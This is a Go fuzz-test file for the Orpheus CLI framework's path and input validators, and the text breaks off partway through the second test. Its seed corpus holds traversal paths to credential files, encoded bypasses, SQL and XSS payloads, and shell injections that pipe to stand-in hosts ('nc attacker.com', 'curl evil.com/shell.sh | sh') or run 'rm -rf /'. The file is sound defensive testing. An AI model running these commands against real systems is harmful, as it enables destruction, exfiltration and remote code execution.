// orpheus_fuzz_test.go: Comprehensive Fuzz Testing Suite for Orpheus CLI Framework
//
// FUZZING STRATEGY AND SECURITY RATIONALE:
//
// This file implements systematic fuzz testing against Orpheus CLI framework security functions,
// designed to discover edge cases, encoding bypasses, and unexpected behaviors that could lead
// to security vulnerabilities in production CLI applications.
//
// THREAT MODEL FOR CLI FUZZ TESTING:
// - Path traversal attacks through malformed paths and encoding tricks
// - Command injection via special characters and shell metacharacters
// - Input validation bypass through Unicode normalization attacks
// - Buffer overflow conditions with extremely long or deeply nested inputs
// - Race conditions in cached validation logic
// - Platform-specific attack vectors (Windows device names, ADS, etc.)
// - Control character injection (null bytes, ANSI escape sequences)
// - Environment variable poisoning through malicious CLI flags
//
// FUZZING PHILOSOPHY:
// Each fuzz test is designed following these principles:
// - PROPERTY-BASED: Tests security invariants that MUST hold for ALL inputs
// - MUTATION-AWARE: Seeds corpus with known attack vectors for intelligent mutations
// - CROSS-PLATFORM: Ensures consistent security across Windows, Linux, macOS
// - PERFORMANCE-CONSCIOUS: Validates that security controls don't degrade with edge cases
// - CORPUS-DRIVEN: Comprehensive seed corpus from real-world attack patterns
//
// SECURITY INVARIANTS (Properties that must ALWAYS hold):
// 1. ValidateSecurePath: NEVER accept paths containing ".." after normalization
// 2. ValidateSecurePath: NEVER accept system paths (/etc, /proc, C:\Windows, etc.)
// 3. ValidateSecurePath: NEVER accept Windows device names (CON, NUL, COM1, etc.)
// 4. ValidateSecurePath: NEVER accept paths with control characters or null bytes
// 5. ValidateSecurePath: NEVER accept Alternate Data Stream notation (:$DATA)
// 6. ValidateInput: NEVER accept injection patterns ($(, `;`, |, &&, etc.)
// 7. ValidateInput: NEVER accept SQL injection keywords in suspicious contexts
// 8. ALL FUNCTIONS: NEVER panic on any input, regardless of size or content
// 9. ALL FUNCTIONS: Return consistent results for equivalent normalized inputs
// 10. ALL FUNCTIONS: Handle extremely long inputs (>100KB) gracefully
//
// METHODOLOGY:
// 1. Seed corpus with known attack vectors from OWASP, CVE databases, and security research
// 2. Define clear security invariants based on Orpheus threat model
// 3. Test boundary conditions: empty strings, max lengths, deep nesting
// 4. Validate cross-platform consistency for path and encoding handling
// 5. Ensure no panics, crashes, or unbounded memory consumption
// 6. Document discovered vulnerabilities and edge cases
//
// RUNNING FUZZ TESTS:
//
// Run a specific fuzz test:
//   go test -fuzz=FuzzValidateSecurePath -fuzztime=30s
//
// Run all fuzz tests briefly:
//   go test -fuzz=. -fuzztime=10s
//
// Run extended fuzzing (recommended for CI/CD):
//   go test -fuzz=FuzzValidateSecurePath -fuzztime=5m
//
// Run with corpus minimization:
//   go test -fuzz=FuzzValidateSecurePath -fuzzminimizetime=30s
//
// INTEGRATION WITH CI/CD:
// These fuzz tests are designed to run continuously in CI/CD pipelines:
// - Short runs (10-30s) on every commit for quick feedback
// - Extended runs (5-30min) on nightly builds for deep discovery
// - Corpus is maintained in testdata/fuzz/ and committed to git
// - New crash findings trigger security review process
//
// Copyright (c) 2025 AGILira - A. Giordano
// Series: an AGILira library
// SPDX-License-Identifier: MPL-2.0

package orpheus

import (
	"strings"
	"testing"
	"unicode"
)

// =============================================================================
// FUZZ TEST 1: PATH SECURITY VALIDATION (HIGHEST PRIORITY)
// =============================================================================

// FuzzValidateSecurePath performs comprehensive fuzz testing on ValidateSecurePath function.
//
// SECURITY CRITICALITY: ★★★★★ (MAXIMUM)
//
// This is the MOST CRITICAL fuzz test in Orpheus because ValidateSecurePath is the
// primary defense against path traversal attacks, which are consistently in OWASP Top 10.
// Any bypass in this function could allow attackers to:
// - Read sensitive system files (/etc/passwd, /etc/shadow, SAM registry)
// - Overwrite critical configuration files
// - Execute arbitrary code through file upload vulnerabilities
// - Escalate privileges by accessing protected directories
//
// ATTACK SURFACE ANALYZED:
// This fuzz test targets the following attack vectors:
// 1. Directory Traversal: ../, ..\\, %2e%2e, Unicode variations
// 2. System Path Access: /etc/*, C:\Windows\*, /proc/*, /sys/*
// 3. Windows Device Names: CON, NUL, COM1-9, LPT1-9, PRN, AUX
// 4. Alternate Data Streams: file.txt:hidden, config.json:$DATA
// 5. Control Characters: null bytes (\x00), ANSI escapes, Unicode control chars
// 6. Encoding Bypass: URL encoding, double encoding, mixed encoding
// 7. Path Length Attacks: extremely long paths (>4096 chars)
// 8. Path Depth Attacks: deeply nested directories (>50 levels)
// 9. Unicode Normalization: combining characters, zero-width characters
// 10. Case Sensitivity: uppercase variations on case-insensitive filesystems
//
// SECURITY INVARIANTS TESTED:
// For ANY input string 's', the following properties MUST hold:
//
// INVARIANT 1: No traversal patterns allowed
//
//	IF result.IsValid == true THEN
//	  result.NormalizedPath MUST NOT contain ".." after filepath.Clean()
//	  result.NormalizedPath MUST NOT contain URL-encoded traversal (%2e%2e)
//
// INVARIANT 2: No system path access
//
//	IF result.IsValid == true THEN
//	  result.NormalizedPath MUST NOT start with /etc/, /proc/, /sys/, /dev/, /boot/, /root/
//	  result.NormalizedPath MUST NOT start with C:\Windows, C:\Program Files (case-insensitive)
//
// INVARIANT 3: No Windows device names (on Windows platform)
//
//	IF runtime.GOOS == "windows" AND result.IsValid == true THEN
//	  filepath.Base(result.NormalizedPath) MUST NOT be CON, NUL, COM1-9, LPT1-9, etc.
//
// INVARIANT 4: No control characters
//
//	IF result.IsValid == true THEN
//	  result.NormalizedPath MUST NOT contain runes with value < 32 or == 127
//	  result.NormalizedPath MUST NOT contain null bytes (\x00)
//
// INVARIANT 5: No Alternate Data Streams (on Windows)
//
//	IF result.IsValid == true THEN
//	  path (after drive letter) MUST NOT contain ':'
//
// INVARIANT 6: Length and depth limits respected
//
//	IF result.IsValid == true THEN
//	  len(result.NormalizedPath) <= config.MaxPathLength
//	  depth(result.NormalizedPath) <= config.MaxPathDepth
//
// INVARIANT 7: Risk assessment consistency
//
//	IF result.IsValid == false AND contains ".." THEN
//	  result.Risk MUST be "critical"
//	IF result.IsValid == false AND system path THEN
//	  result.Risk MUST be "critical"
//
// INVARIANT 8: Never panic
//
//	For ANY input, ValidateSecurePath MUST NOT panic
//	This includes: empty strings, extremely long strings, invalid UTF-8, binary data
//
// FUZZING SEED CORPUS:
// The seed corpus is carefully constructed to cover:
// - Known CVE exploits for path traversal
// - OWASP testing guide examples
// - Real-world attack patterns from security research
// - Platform-specific edge cases (Windows vs Unix)
// - Unicode and encoding variations
// - Boundary conditions (empty, max length, max depth)
//
// EXPECTED FUZZ FINDINGS:
// This fuzzer is expected to potentially discover:
// - Novel Unicode normalization bypasses
// - OS-specific path handling inconsistencies
// - Edge cases in filepath.Clean() behavior
// - Unexpected interactions between multiple validation layers
// - Performance degradation with pathological inputs
// - Race conditions in cached validation (if enabled)
//
// PERFORMANCE CHARACTERISTICS:
// ValidateSecurePath should maintain ~200ns performance even with fuzzed inputs.
// The fuzzer validates that performance doesn't degrade exponentially with input size.
func FuzzValidateSecurePath(f *testing.F) {
	// ==========================================================================
	// SEED CORPUS SECTION 1: LEGITIMATE VALID PATHS
	// These should ALWAYS pass validation - baseline for fuzzer mutations
	// ==========================================================================

	// Simple relative paths (most common in CLI applications)
	f.Add("config.json")
	f.Add("config.yaml")
	f.Add("app.toml")
	f.Add("settings.ini")

	// Paths with subdirectories (normal application structure)
	f.Add("config/database.json")
	f.Add("configs/app/production.yaml")
	f.Add("data/cache/sessions.db")
	f.Add(".config/myapp/settings.toml") // Hidden directories (valid)

	// Absolute paths (legitimate system locations for user data)
	f.Add("/home/user/config.json")
	f.Add("/var/lib/myapp/data.db")
	f.Add("/opt/myapp/config.yaml")

	// Windows absolute paths (legitimate program data locations)
	f.Add("C:\\Users\\Public\\config.json")
	f.Add("C:\\ProgramData\\MyApp\\settings.ini")
	f.Add("D:\\Projects\\config.yaml")

	// Paths with legitimate special characters
	f.Add("config-production.json")   // Hyphens
	f.Add("config_staging.yaml")      // Underscores
	f.Add("app.config.toml")          // Multiple dots
	f.Add("My App Config.json")       // Spaces (legitimate)
	f.Add("config@v1.2.3.yaml")       // Version markers
	f.Add("user-config[backup].json") // Brackets
	f.Add("config(1).json")           // Parentheses (common in duplicates)

	// ==========================================================================
	// SEED CORPUS SECTION 2: PATH TRAVERSAL ATTACKS (Should ALWAYS FAIL)
	// These are the PRIMARY attack vectors for CLI path parameters
	// ==========================================================================

	// Basic directory traversal patterns
	f.Add("../../../etc/passwd")        // Unix password file (classic attack)
	f.Add("../../../../etc/shadow")     // Unix shadow password file
	f.Add("../../../root/.ssh/id_rsa")  // SSH private keys
	f.Add("../../.ssh/authorized_keys") // SSH authorized keys

	// Windows directory traversal
	f.Add("..\\..\\..\\Windows\\System32\\config\\SAM")      // Windows SAM file
	f.Add("..\\..\\..\\Windows\\System32\\config\\SECURITY") // Windows security file
	f.Add("../../../../Windows/win.ini")                     // Windows config

	// Mixed separator attacks (works on Windows, sometimes bypasses validation)
	f.Add("../..\\../../etc/passwd")        // Forward and backslash mix
	f.Add("..\\../../../etc/shadow")        // Backslash and forward mix
	f.Add("config\\..\\../../../etc/hosts") // Start valid, then traverse

	// Path traversal with valid-looking prefixes (social engineering)
	f.Add("config/../../../etc/passwd")        // Looks like config directory
	f.Add("logs/../../../../../../etc/shadow") // Looks like logs directory
	f.Add("backup/../../root/.bashrc")         // Looks like backup directory

	// Complex traversal patterns (multiple techniques combined)
	f.Add("./../../../../../../etc/passwd")    // Current dir + traversal
	f.Add("config/./../../../etc/shadow")      // Intermediate current dir
	f.Add("config//..//../../etc/hosts")       // Double slashes
	f.Add("config\\.\\.\\..\\..\\etc\\passwd") // Windows current dir markers

	// ==========================================================================
	// SEED CORPUS SECTION 3: URL ENCODING BYPASS ATTEMPTS
	// Attackers use encoding to bypass naive string matching
	// ==========================================================================

	// Single URL encoding of directory traversal
	f.Add("%2e%2e/%2e%2e/etc/passwd")       // .. encoded as %2e%2e
	f.Add("%2e%2e%2f%2e%2e%2fetc%2fpasswd") // Full path encoded
	f.Add("..%2f..%2fetc%2fpasswd")         // Only slashes encoded

	// Double URL encoding (sometimes bypasses filters that decode once)
	f.Add("%252e%252e/%252e%252e/etc/passwd")  // Double encoded ..
	f.Add("%252e%252e%252f%252e%252e%252fetc") // Full double encoding

	// Mixed encoding (combination of encoded and plain)
	f.Add("%2e%2e/../../etc/passwd") // Mix encoded and plain
	f.Add("..%2f../etc/passwd")      // Slash encoding only
	f.Add("%2e./../../etc/passwd")   // Partial dot encoding

	// Windows backslash encoding
	f.Add("%2e%2e\\%2e%2e\\windows\\system32") // Encoded dots, plain backslashes
	f.Add("..%5c..%5cwindows%5csystem32")      // Backslash as %5c

	// Null byte injection with encoding (path truncation attack)
	f.Add("config%00.txt")                 // Null byte might truncate
	f.Add("config.txt%00../../etc/passwd") // Null + traversal

	// ==========================================================================
	// SEED CORPUS SECTION 4: WINDOWS DEVICE NAMES (Should ALWAYS FAIL on Windows)
	// Reserved names that can cause unexpected behavior or security issues
	// ==========================================================================

	// Console and printer devices
	f.Add("CON")        // Console device
	f.Add("CON.txt")    // With extension
	f.Add("config/CON") // In subdirectory
	f.Add("PRN")        // Printer device
	f.Add("PRN.log")    // Printer with extension

	// Communication ports
	f.Add("COM1")     // Serial port 1
	f.Add("COM2.dat") // Serial port with extension
	f.Add("COM3")
	f.Add("COM4")
	f.Add("COM5")
	f.Add("COM6")
	f.Add("COM7")
	f.Add("COM8")
	f.Add("COM9")

	// Parallel ports
	f.Add("LPT1") // Parallel port 1
	f.Add("LPT1.txt")
	f.Add("LPT2")
	f.Add("LPT3")

	// Other reserved devices
	f.Add("AUX") // Auxiliary device
	f.Add("AUX.conf")
	f.Add("NUL") // Null device
	f.Add("NUL.json")

	// Case variations (Windows is case-insensitive)
	f.Add("con")     // Lowercase
	f.Add("Con")     // Mixed case
	f.Add("CON")     // Uppercase
	f.Add("CoN.TxT") // Mixed case with extension

	// ==========================================================================
	// SEED CORPUS SECTION 5: ALTERNATE DATA STREAMS (Windows-specific attack)
	// ADS can hide malicious content or bypass file type restrictions
	// ==========================================================================

	f.Add("config.json:hidden")    // Hidden stream
	f.Add("app.exe:$DATA")         // Explicit DATA stream
	f.Add("file.txt:stream:$DATA") // Named stream
	f.Add("config.ini::$DATA")     // Double colon
	f.Add("C:\\test.txt:secret")   // Absolute path with ADS

	// ==========================================================================
	// SEED CORPUS SECTION 6: SYSTEM PATH ACCESS ATTEMPTS
	// Direct access to sensitive system directories
	// ==========================================================================

	// Unix/Linux system paths
	f.Add("/etc/passwd")         // Most famous system file
	f.Add("/etc/shadow")         // Shadow passwords
	f.Add("/etc/hosts")          // Hosts file
	f.Add("/etc/sudoers")        // Sudo configuration
	f.Add("/proc/self/mem")      // Process memory
	f.Add("/proc/self/environ")  // Environment variables
	f.Add("/sys/kernel/debug")   // Kernel debug interface
	f.Add("/dev/sda")            // Block device
	f.Add("/boot/grub/grub.cfg") // Boot configuration
	f.Add("/root/.ssh/id_rsa")   // Root SSH key

	// Windows system paths
	f.Add("C:\\Windows\\System32\\config\\SAM")         // Security Account Manager
	f.Add("C:\\Windows\\System32\\config\\SECURITY")    // Security settings
	f.Add("C:\\Windows\\win.ini")                       // Windows config
	f.Add("C:\\Windows\\System32\\drivers\\etc\\hosts") // Windows hosts
	f.Add("C:\\Program Files\\sensitive.dat")           // Program Files
	f.Add("C:\\ProgramData\\secret.key")                // Program Data

	// Case variations for case-insensitive filesystems
	f.Add("/ETC/PASSWD")                        // Uppercase Unix
	f.Add("/Etc/Shadow")                        // Mixed case
	f.Add("c:\\windows\\system32\\config\\sam") // Lowercase Windows
	f.Add("C:\\WINDOWS\\SYSTEM32\\CONFIG\\SAM") // Uppercase Windows

	// ==========================================================================
	// SEED CORPUS SECTION 7: CONTROL CHARACTERS AND SPECIAL BYTES
	// Characters that can cause parsing issues or security vulnerabilities
	// ==========================================================================

	// Null byte injection (can truncate paths in C code)
	f.Add("config\x00.json") // Null in middle
	f.Add("\x00config.json") // Null at start
	f.Add("config.json\x00") // Null at end

	// ASCII control characters
	f.Add("config\x01.json") // SOH (Start of Heading)
	f.Add("config\x02.json") // STX (Start of Text)
	f.Add("config\x1F.json") // US (Unit Separator)
	f.Add("config\x7F.json") // DEL (Delete)

	// High bytes and non-ASCII
	f.Add("config\xFF.json")     // High byte
	f.Add("config\xFE\xFF.json") // BOM-like sequence

	// ANSI escape sequences (can manipulate terminal output)
	f.Add("config\x1b[31m.json") // Red color escape
	f.Add("\x1b[2Jconfig.json")  // Clear screen escape

	// ==========================================================================
	// SEED CORPUS SECTION 8: LENGTH AND DEPTH ATTACKS
	// Test boundary conditions and resource exhaustion
	// ==========================================================================

	// Very long filenames (testing MaxPathLength = 4096)
	f.Add(strings.Repeat("a", 100) + ".json")  // 100 char filename
	f.Add(strings.Repeat("x", 1000) + ".json") // 1000 chars
	f.Add(strings.Repeat("y", 4000) + ".json") // Near limit
	f.Add(strings.Repeat("z", 5000) + ".json") // Over limit (should fail)

	// Very deep directory nesting (testing MaxPathDepth = 50)
	f.Add(strings.Repeat("dir/", 10) + "config.json") // 10 levels
	f.Add(strings.Repeat("a/", 25) + "config.json")   // 25 levels
	f.Add(strings.Repeat("x/", 51) + "config.json")   // Over limit (should fail)

	// Long traversal attempts (resource exhaustion)
	f.Add(strings.Repeat("../", 50) + "etc/passwd")  // 50 traversals
	f.Add(strings.Repeat("../", 100) + "etc/passwd") // 100 traversals

	// Combination: long path + deep nesting
	f.Add(strings.Repeat("abc/", 30) + strings.Repeat("x", 100) + ".json")

	// ==========================================================================
	// SEED CORPUS SECTION 9: UNICODE AND INTERNATIONALIZATION
	// Unicode normalization attacks and encoding issues
	// ==========================================================================

	// Non-ASCII characters (legitimate in modern filesystems)
	f.Add("café.json")          // French accents
	f.Add("configuración.yaml") // Spanish ñ
	f.Add("конфиг.json")        // Cyrillic (Russian)
	f.Add("設定.yaml")            // Chinese characters
	f.Add("日本語.txt")            // Japanese
	f.Add("العربية.conf")       // Arabic

	// Unicode combining characters (normalization attacks)
	f.Add("cafe\u0301.json")         // é as e + combining accent
	f.Add("config\u0300\u0301.json") // Multiple combining chars

	// Zero-width and invisible characters
	f.Add("config\u200B.json") // Zero-width space
	f.Add("config\u200C.json") // Zero-width non-joiner
	f.Add("config\u200D.json") // Zero-width joiner
	f.Add("config\uFEFF.json") // Zero-width no-break space (BOM)

	// Right-to-left override (visual spoofing)
	f.Add("config\u202E.json") // Right-to-left override

	// Emoji and supplementary characters
	f.Add("config😀.json") // Emoji
	f.Add("file🚀.yaml")   // Rocket emoji

	// Unicode path traversal attempts
	f.Add("\uFF0E\uFF0E/etc/passwd") // Fullwidth dots (．．)
	f.Add("\u2024\u2024/etc/passwd") // One dot leader

	// ==========================================================================
	// SEED CORPUS SECTION 10: EDGE CASES AND SPECIAL PATTERNS
	// Unusual but potentially valid or problematic inputs
	// ==========================================================================

	// Empty and whitespace
	f.Add("")    // Empty string
	f.Add(" ")   // Single space
	f.Add("   ") // Multiple spaces
	f.Add("\t")  // Tab
	f.Add("\n")  // Newline

	// Current and parent directory markers
	f.Add(".")             // Current directory
	f.Add("..")            // Parent directory
	f.Add("./config.json") // Explicit current dir
	f.Add("./")            // Current dir only

	// Multiple slashes and dots
	f.Add("config//file.json")  // Double slash
	f.Add("config///file.json") // Triple slash
	f.Add("config..json")       // Double dot (valid filename)
	f.Add("...json")            // Three dots
	f.Add("....json")           // Four dots

	// Trailing slashes and dots
	f.Add("config.json/") // Trailing slash
	f.Add("config.json.") // Trailing dot (Windows issue)
	f.Add("config.json ") // Trailing space (Windows)

	// Special filenames
	f.Add(".")        // Hidden file marker
	f.Add("..")       // Parent directory
	f.Add("...")      // Three dots (valid on some systems)
	f.Add(".config")  // Hidden file (valid)
	f.Add("..config") // Double dot prefix (valid)

	// Mixed valid and invalid patterns
	f.Add("config.json#fragment") // URL fragment
	f.Add("config.json?query=1")  // URL query
	f.Add("config.json;extra")    // Semicolon
	f.Add("config.json&params")   // Ampersand

	// ==========================================================================
	// FUZZ EXECUTION: PROPERTY-BASED VALIDATION
	// ==========================================================================

	f.Fuzz(func(t *testing.T, path string) {
		// Get default security configuration for consistent testing
		config := DefaultSecurityConfig()

		// CRITICAL: The function must NEVER panic, regardless of input
		// This is tested implicitly - if it panics, the fuzz test fails
		result := ValidateSecurePath(path, config)

		// INVARIANT 0: Result must never be nil
		if result == nil {
			t.Fatalf("ValidateSecurePath returned nil result for path: %q", path)
		}

		// INVARIANT 1: Original path must be preserved in result
		if result.Path != path {
			t.Errorf("Result.Path modified: got %q, want %q", result.Path, path)
		}

		// Skip detailed validation for empty paths (special case handled correctly)
		if path == "" {
			if result.IsValid {
				t.Error("Empty path should not be valid")
			}
			return
		}

		// INVARIANT 2: If path is valid, normalized path must not contain ".." after cleaning
		// This is the MOST CRITICAL security invariant - prevents directory traversal
		if result.IsValid {
			normalizedLower := strings.ToLower(result.NormalizedPath)

			// Check for literal ".." anywhere in the path
			if strings.Contains(normalizedLower, "..") {
				t.Errorf("CRITICAL SECURITY VIOLATION: Valid path contains '..': %q (original: %q)",
					result.NormalizedPath, path)
			}

			// Check for URL-encoded traversal patterns (complete patterns only, not partial)
			// We check for complete patterns like %2e%2e (encoded ..) not just %2e (encoded .)
			// because a single encoded dot is not a security issue
			if strings.Contains(normalizedLower, "%2e%2e") {
				t.Errorf("CRITICAL: Valid path contains URL-encoded '..': %q", result.NormalizedPath)
			}
			// Check for double URL-encoded complete traversal pattern
			if strings.Contains(normalizedLower, "%252e%252e") {
				t.Errorf("CRITICAL: Valid path contains double URL-encoded '..': %q", result.NormalizedPath)
			}
		}

		// INVARIANT 3: If path is valid, it must not access system directories
		// This prevents reading sensitive files like /etc/passwd, C:\Windows\System32\config\SAM
		if result.IsValid {
			lowerPath := strings.ToLower(strings.ReplaceAll(result.NormalizedPath, "\\", "/"))

			// Unix/Linux system paths that should NEVER be accessible
			systemPaths := []string{
				"/etc/", "/proc/", "/sys/", "/dev/", "/boot/", "/root/",
				"/usr/bin/", "/usr/sbin/", "/sbin/", "/bin/",
			}

			for _, sysPath := range systemPaths {
				if strings.HasPrefix(lowerPath, sysPath) {
					t.Errorf("CRITICAL: Valid path accesses system directory %s: %q",
						sysPath, result.NormalizedPath)
				}
			}

			// Windows system paths
			windowsPaths := []string{
				"c:/windows/", "c:/program files/", "c:/program files (x86)/",
			}
			for _, winPath := range windowsPaths {
				if strings.HasPrefix(lowerPath, winPath) {
					t.Errorf("CRITICAL: Valid path accesses Windows system directory %s: %q",
						winPath, result.NormalizedPath)
				}
			}

			// Specific sensitive files - only check if path actually matches these exact absolute paths
			// to avoid false positives with random strings that happen to contain these substrings
			// We check if the path IS or STARTS WITH these system paths (exact prefix match)
			sensitiveFiles := []string{
				"/etc/passwd", "/etc/shadow", "/etc/sudoers",
				"c:/windows/system32/config/sam", "c:/windows/system32/config/security",
			}
			for _, sensitive := range sensitiveFiles {
				// Only match if it's the exact path or the path starts with it followed by a separator
				if lowerPath == sensitive ||
					strings.HasPrefix(lowerPath, sensitive+"/") ||
					strings.HasPrefix(lowerPath, sensitive+"\\") {
					t.Errorf("CRITICAL: Valid path accesses sensitive file %q: %q",
						sensitive, result.NormalizedPath)
				}
			}
		}

		// INVARIANT 4: If path is valid, it must not contain control characters
		// Control characters can cause terminal injection, null byte attacks, etc.
		if result.IsValid {
			for i, r := range result.NormalizedPath {
				// Check for null bytes (path truncation attack)
				if r == 0 {
					t.Errorf("CRITICAL: Valid path contains null byte at position %d: %q", i, path)
				}

				// Check for other control characters
				if r < 32 || r == 127 || (r >= 128 && r <= 159) {
					t.Errorf("SECURITY: Valid path contains control character %U at position %d: %q",
						r, i, path)
				}
			}
		}

		// INVARIANT 5: If path is valid, it must not contain Alternate Data Streams
		// ADS can hide malicious content on Windows filesystems
		if result.IsValid {
			// Use the same logic as containsAlternateDataStream for consistency
			normalized := strings.ReplaceAll(result.NormalizedPath, "\\", "/")
			parts := strings.Split(normalized, "/")

			for i, part := range parts {
				// Skip drive letters (first part on Windows: "C:", "C:.", "C:path", etc.)
				if i == 0 && len(part) >= 2 && part[1] == ':' && unicode.IsLetter(rune(part[0])) {
					// This is a drive letter, check if there's anything after the colon
					// that itself contains another colon (which would be ADS)
					if len(part) > 2 {
						remainingPart := part[2:]
						if strings.Contains(remainingPart, ":") {
							t.Errorf("CRITICAL: Valid path contains Alternate Data Stream after drive: %q", result.NormalizedPath)
							break
						}
					}
					continue // Valid drive letter, skip to next part
				}

				// For all other parts, any colon indicates ADS
				if strings.Contains(part, ":") {
					t.Errorf("CRITICAL: Valid path contains Alternate Data Stream: %q", result.NormalizedPath)
					break
				}
			}
		}

		// INVARIANT 6: Length limits must be enforced
		if result.IsValid {
			if len(result.NormalizedPath) > config.MaxPathLength {
				t.Errorf("Valid path exceeds MaxPathLength (%d): length=%d, path=%q",
					config.MaxPathLength, len(result.NormalizedPath), result.NormalizedPath)
			}
		}

		// INVARIANT 7: Result must contain errors if invalid
		// This ensures that when a path is rejected, the user gets a clear reason why
		if !result.IsValid && len(result.Errors) == 0 {
			t.Errorf("Invalid path has no error messages: %q", path)
		}

		// INVARIANT 9: Valid paths should have normalized form
		if result.IsValid && result.NormalizedPath == "" {
			t.Errorf("Valid path has empty normalized path: %q", path)
		}

		// PERFORMANCE CHECK: Ensure no catastrophic backtracking or exponential behavior
		// ValidateSecurePath should complete in microseconds even for pathological inputs
		// This is implicitly tested by the fuzzer's timeout mechanism
	})
}

// =============================================================================
// FUZZ TEST 2: INPUT VALIDATION (HIGH PRIORITY)
// =============================================================================

// FuzzValidateInput performs comprehensive fuzz testing on input validation functions.
//
// SECURITY CRITICALITY: ★★★★☆ (HIGH)
//
// Input validation is critical for preventing injection attacks in CLI applications.
// This fuzz test targets the InputValidator.ValidateInput() function which checks
// for command injection, SQL injection, and other malicious patterns in CLI arguments.
//
// ATTACK SURFACE ANALYZED:
// 1. Command Injection: $(), “, ;, |, &&, ||
// 2. SQL Injection: --, /*, */, DROP, DELETE, INSERT, UNION, SELECT
// 3. Script Injection: <script>, javascript:, eval()
// 4. Control Characters: null bytes, ANSI escapes, format strings
// 5. Length Attacks: inputs > MaxArgLength (4096 default)
// 6. Unicode Tricks: normalization, zero-width, right-to-left override
//
// SECURITY INVARIANTS:
// For ANY input string 's', ValidateInput(s) must:
//
// INVARIANT 1: Reject command injection patterns
//
//	IF input contains '$(' OR '`' OR ';' OR '|' OR '&&' OR '||' THEN
//	  ValidateInput MUST return error
//
// INVARIANT 2: Reject SQL injection keywords in suspicious contexts
//
//	IF input contains 'DROP' OR 'DELETE' OR 'INSERT' OR '--' OR '/*' THEN
//	  ValidateInput MUST return error
//
// INVARIANT 3: Reject control characters (except tab, LF, CR)
//
//	IF input contains rune < 32 (except 9, 10, 13) OR rune == 127 THEN
//	  ValidateInput MUST return error
//
// INVARIANT 4: Reject null bytes
//
//	IF input contains '\x00' THEN
//	  ValidateInput MUST return error
//
// INVARIANT 5: Enforce length limits
//
//	IF len(input) > MaxArgLength (default 4096) THEN
//	  ValidateInput MUST return error
//
// INVARIANT 6: Never panic
//
//	For ANY input, ValidateInput MUST NOT panic
func FuzzValidateInput(f *testing.F) {
	// ==========================================================================
	// SEED CORPUS: LEGITIMATE INPUTS (should pass)
	// ==========================================================================

	// Normal CLI arguments
	f.Add("start")
	f.Add("stop")
	f.Add("restart")
	f.Add("status")
	f.Add("config")
	f.Add("help")
	f.Add("version")

	// File and directory names
	f.Add("config.json")
	f.Add("app-config.yaml")
	f.Add("database_prod.toml")
	f.Add("my-app-v1.2.3")

	// Common flag values
	f.Add("production")
	f.Add("development")
	f.Add("localhost")
	f.Add("127.0.0.1")
	f.Add("8080")
	f.Add("true")
	f.Add("false")

	// ==========================================================================
	// SEED CORPUS: COMMAND INJECTION ATTACKS (should fail)
	// ==========================================================================

	// Shell command injection
	f.Add("$(rm -rf /)")                         // Command substitution
	f.Add("`rm -rf /`")                          // Backtick command substitution
	f.Add("test; rm -rf /")                      // Command chaining with semicolon
	f.Add("test | nc attacker.com 1234")         // Pipe to network
	f.Add("test && curl evil.com/shell.sh | sh") // AND operator
	f.Add("test || wget evil.com/malware")       // OR operator
	f.Add("test & background-evil &")            // Background execution

	// Nested command injection
	f.Add("$(echo $(whoami))")
	f.Add("`curl $(cat /etc/passwd)`")

	// ==========================================================================
	// SEED CORPUS: SQL INJECTION ATTACKS (should fail)
	// ==========================================================================

	f.Add("'; DROP TABLE users--")             // Classic SQL injection
	f.Add("1' OR '1'='1")                      // Always true condition
	f.Add("admin'--")                          // Comment out rest
	f.Add("' UNION SELECT * FROM passwords--") // UNION attack
	f.Add("'; DELETE FROM logs WHERE '1'='1")  // Destructive query
	f.Add("' OR 1=1--")                        // Boolean injection
	f.Add("/**/SELECT/**/")                    // Comment obfuscation
	f.Add("1'; EXEC xp_cmdshell('dir')--")     // Command execution via SQL

	// ==========================================================================
	// SEED CORPUS: SCRIPT INJECTION (should fail)
	// ==========================================================================

	f.Add("<script>alert(1)</script>")    // XSS
	f.Add("javascript:alert(1)")          // JavaScript protocol
	f.Add("<img src=x onerror=alert(1)>") // Image XSS
	f.Add("eval('malicious code')")       // Eval injection

	// ==========================================================================
	// SEED CORPUS: CONTROL CHARACTER INJECTION (should fail)
	// ==========================================================================

	f.Add("test\x00injection")           // Null byte
	f.Add("test\x01\x02\x03")            // Control chars
	f.Add("test\x1b[31mred\x1b[0m")      // ANSI color codes
	f.Add("test\x7Fdelete")              // DEL character
	f.Add("test\r\nHTTP/1.1 200 OK\r\n") // HTTP response injection

	// ==========================================================================
	// SEED CORPUS: LENGTH ATTACKS
	// ==========================================================================

	f.Add(strings.Repeat("A", 100))   // 100 chars (valid)
	f.Add(strings.Repeat("B", 1000))  // 1000 chars (valid)
	f.Add(strings.Repeat("C", 4096))  // At limit
	f.Add(strings.Repeat("D", 5000))  // Over limit (should fail)
	f.Add(strings.Repeat("E", 10000)) // Way over limit

	// ==========================================================================
	// SEED CORPUS: UNICODE ATTACKS
	// ==========================================================================

	f.Add("test\u200Bhidden")  // Zero-width space
	f.Add("test\u202Ereverse") // Right-to-left override
	f.Add("test\uFEFF")        // Zero-width no-break space
	f.Add("café")              // Legitimate Unicode (should pass)

	// ==========================================================================
	// FUZZ EXECUTION
	// ==========================================================================

	f.Fuzz(func(t *testing.T, input string) {
		// Create validator with default configuration
		config := DefaultValidationConfig()
		validator := NewInputValidator(config)

		// CRITICAL: Must never panic
		err := validator.ValidateInput(input)

		// INVARIANT 1: Command injection patterns must be rejected
		dangerousPatterns := []string{
			"$(", "`", ";", "|", "&&", "||",
		}

		hasInjectionPattern := false
		for _, pattern := range dangerousPatterns {
			if strings.Contains(input, pattern) {
				hasInjectionPattern = true
				break
			}
		}

		if hasInjectionPattern && err == nil {
			t.Errorf("CRITICAL: Command injection pattern not caught: %q", input)
		}

		// INVARIANT 2: SQL injection keywords must be rejected
		sqlKeywords := []string{
			"DROP", "DELETE", "INSERT", "--", "/*", "*/",
		}

		hasSQLPattern := false
		inputUpper := strings.ToUpper(input)
		for _, keyword := range sqlKeywords {
			if strings.Contains(inputUpper, keyword) {
				hasSQLPattern = true
				break
			}
		}

		if hasSQLPattern && err == nil {
			t.Errorf("WARNING: SQL injection pattern not caught: %q", input)
		}

		// INVARIANT 3: Null bytes must be rejected
		if strings.Contains(input, "\x00") && err == nil {
			t.Errorf("CRITICAL: Null byte not rejected: %q", input)
		}

		// INVARIANT 4: Control characters must be rejected (except tab, LF, CR)
		for i, r := range input {
			if r < 32 && r != 9 && r != 10 && r != 13 {
				if err == nil {
					t.Errorf("Control character at position %d not rejected: %q (char: %U)", i, input, r)
				}
				break
			}
		}

		// INVARIANT 5: Length limit must be enforced
		if len(input) > config.MaxArgLength && err == nil {
